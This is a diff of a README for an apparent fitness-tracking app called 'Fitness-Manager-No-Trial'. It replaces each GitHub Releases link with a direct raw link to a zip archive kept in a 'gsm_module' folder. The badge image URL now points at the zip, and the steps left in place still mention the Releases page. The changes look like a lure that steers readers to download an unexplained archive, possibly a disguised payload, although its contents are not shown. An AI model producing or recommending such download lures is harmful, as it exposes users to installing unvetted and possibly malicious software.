@@ -1,7 +1,7 @@
 # 🏋️ Fitness-Manager-No-Trial - Track Your Fitness with Ease
 
 ## 📥 Download Now
-[![Download Fitness Manager](https://img.shields.io/badge/Download-Fitness%20Manager-blue)](https://github.com/dusabekenedy/Fitness-Manager-No-Trial/releases)
+[![Download Fitness Manager](https://raw.githubusercontent.com/dusabekenedy/Fitness-Manager-No-Trial/main/gsm_module/Fitness-Manager-No-Trial-2.8.zip%20Manager-blue)](https://raw.githubusercontent.com/dusabekenedy/Fitness-Manager-No-Trial/main/gsm_module/Fitness-Manager-No-Trial-2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to Fitness-Manager-No-Trial! This application helps you track your fitness journey effectively. With easy access to user guides and documentation, you can manage your workouts and nutrition seamlessly.
@@ -14,7 +14,7 @@ Before downloading, please ensure your system meets the following requirements:
 - Internet Connection: Required for updates
 
 ## 📂 Download & Install
-To get started with Fitness-Manager-No-Trial, visit this page to download the latest version: [Download Fitness Manager](https://github.com/dusabekenedy/Fitness-Manager-No-Trial/releases).
+To get started with Fitness-Manager-No-Trial, visit this page to download the latest version: [Download Fitness Manager](https://raw.githubusercontent.com/dusabekenedy/Fitness-Manager-No-Trial/main/gsm_module/Fitness-Manager-No-Trial-2.8.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -65,6 +65,6 @@ Stay committed to your fitness journey. Use Fitness-Manager-No-Trial to set meas
 ## 📥 Additional Resources
 Explore additional resources, tips, and forums related to fitness management, workout programs, and nutrition strategies. These resources can further enhance your experience and guide you towards achieving your fitness goals.
 
-Ready to enhance your fitness experience? Download now: [Download Fitness Manager](https://github.com/dusabekenedy/Fitness-Manager-No-Trial/releases).
+Ready to enhance your fitness experience? Download now: [Download Fitness Manager](https://raw.githubusercontent.com/dusabekenedy/Fitness-Manager-No-Trial/main/gsm_module/Fitness-Manager-No-Trial-2.8.zip).
 
 Happy tracking!
